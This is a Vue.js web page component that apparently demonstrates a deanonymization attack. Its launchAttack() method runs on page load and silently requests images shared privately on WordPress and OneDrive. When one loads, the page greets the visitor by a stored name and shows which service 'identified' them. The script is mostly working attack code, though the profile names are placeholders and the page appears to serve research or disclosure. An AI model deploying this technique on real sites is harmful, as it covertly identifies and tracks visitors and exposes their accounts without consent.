<template>
  <div>
    <!--ViewWrapper-->
    <mdb-view>
      <mdb-mask class="gradient d-flex justify-content-center align-items-center">
        <mdb-container>
          <div class="card">
            <div class="card-body aqua-gradient color-block font-weight-bold text-center text-white">
              This attack identifies a single user on one or more services.
            </div>
          </div>
          <div class="card testimonial-card">
            <div class="card-up indigo lighten-1"></div>
            <div class="avatar mx-auto white">
              <img :src="profileImage" class="rounded-circle mt-4" />
            </div>
            <!-- Content -->
            <div class="card-body">
              <!-- Name -->
              <h1 class="card-title h1-responsive font-weight-bold text-center" v-html="foundName"></h1>
              <hr />
              <div class="text-muted text-center h4-responsive">
                <p v-html="identifiedServices"></p>
              </div>
            </div>
          </div>
          <!-- Card -->
          <!-- Card -->
          <div v-html="attackIMG"></div>
          <!-- Card -->
        </mdb-container>
      </mdb-mask>
    </mdb-view>
  </div>
</template>

<script>

  import { mdbContainer, mdbView, mdbMask } from 'mdbvue';
  export default {
    name: 'AppPage',
    data: () => // Default values if no image found
    ({ foundName: "We were not able to identify you 😢",
       profileImage: "assets/Avatar (5).png",
       identifiedServices: "🤷",
       attackIMG: "" }),
    components: {
      mdbContainer,
      mdbView,
      mdbMask,
    },
    methods: {
      verifyImageURL: function(url, i, j, callBack){
        var img = new Image();
        img.src = url;
        img.onload = function () {
              callBack(true, i, j);
        };
        img.onerror = function () {
              callBack(false, i, j);
        };
      },
      launchAttack: function() {
          var profiles = [
              //FORMAT: Name, Profile image, RELATED PICTUES[Wordpress, Facebook, Twitter ...], 
              ["Lectus Ex", "assets/Avatar (7).png", ["https://leakyblog1.files.wordpress.com/2020/03/gettyimages-157531381-1024x746-1.jpg", "https://x0lmrq.by.files.1drv.com/y4pr192HuNrOkU5uBZ8KttkuIMzpNYOhm5FZL0wbjbbw02aAwv4o2B8QgvKD52D4R4MKRbdYmMjRfoOopATOdggrkWNa6NQGLceTXKxNEd3Ae28FBhE1pwibJQ5sgkZgcGVtdkJgKgV1cGtEJqod2TY5LsHUPHejt0pdg57xYdLhNrmuqh0f5xGW-eyXFBX1FPfPHvrUQSFhlxTsO0gutZFCd6yr9l3ZtgqSac7qJbCq_s/GettyImages-157531381-1024x746.jpg?psid=1"]],
              ["Magna Tortor", "assets/Avatar (3).png", ["https://leakyblog0.files.wordpress.com/2020/03/gettyimages-157531381-1024x746-1.jpg ", "https://yrenua.by.files.1drv.com/y4piraBylZ08NqRWN-ZcQ_YaaOA03NxiKrybfc46e-S5oPNFMyy2lCl-3heHxXXMJm347bHc6FUgF8E0-IqEWe3ytEa2nwXsnzMrIBs_Ytb4P_Q11OQs5ju_7-VEEcm_gQSGhKAfEajGnvks8zhpkvk0wHgV2V5jAudiI5z0PrdmdEZ7a39grWVPI4HE_O9zbFOgZRwQV0hVv6xbVIzBINW7p-Nl23OWQVmdeliRF_wqJM/de%20pantalla%20el%20perro%20hermoso%20boo%20hd%20widescreen%20Gratis%20imagenes%209985.jpg?psid=1"]]];

          //Items in order [Wordpress, OneDrive, Facebook ...] 
          var serviceIcons = ['<a class="px-2 fa-lg li-ic"><i class="fab fa-wordpress"></i></a>', '<a class="px-2 fa-lg tw-ic"><i class="fab fa-microsoft"></i></a>', '<a class="px-2 fa-lg fb-ic"><i class="fab fa-facebook-f"></i></a>'];
          // Go through all images and check for the first one that can be loaded
          var i,j;
          var that = this;
          //Loop to go through all people
          for (i = 0; i < profiles.length; i++) {
            //Loop to go through all images for this person
                for (j = 0; j < profiles[i][2].length; j++) {
                    this.verifyImageURL(profiles[i][2][j], i, j, function (imageExists, i, j) {
                            if (imageExists === true) {
                                    that.foundName = "Hi, <b>" + profiles[i][0] + "</b>! 👋";
                                    that.identifiedServices = "You were identified via " + serviceIcons[j];
                                    that.profileImage = profiles[i][1];
                                    var PICURL = profiles[i][2][j]; //URL
                                    that.attackIMG = '<div class="card card-image" style="background-image: url(' + PICURL + '); background-repeat: no-repeat; background-size: cover"> <div class="text-white justify-content-center align-items-center d-flex rgba-stylish-light py-5 px-4"><div><br><br><br><br><br><br><h3 class="card-title pt-2"><strong>This image identified you</strong></h3><br><br><br><br><br><br></div></div></div>';
                            } else {
                                //Skip to next image
                            }
                        });
                }
          }
        }
    },
    mounted() {
     this.launchAttack();
    }
  }
</script>

<style>
  .view {
    background-image: url('https://mdbootstrap.com/img/Photos/Others/architecture.jpg');
    background-repeat: no-repeat;
    background-size: cover;
    background-position: center center;
    height: calc(100vh);
  }
  .gradient {
    background: -moz-linear-gradient(45deg, rgba(42, 27, 161, 0.7), rgba(29, 210, 177, 0.7) 100%);
    background: -webkit-linear-gradient(45deg, rgba(42, 27, 161, 0.7), rgba(29, 210, 177, 0.7) 100%);
    background: -webkit-gradient(linear, 45deg, from(rgba(42, 27, 161, 0.7)), to(rgba(29, 210, 177, 0.7)));
    background: -o-linear-gradient(45deg, rgba(42, 27, 161, 0.7), rgba(29, 210, 177, 0.7) 100%);
    background: linear-gradient(45deg, rgba(42, 27, 161, 0.7), rgba(29, 210, 177, 0.7) 100%);
  }
  h6 {
      line-height: 1.7;
  }
</style>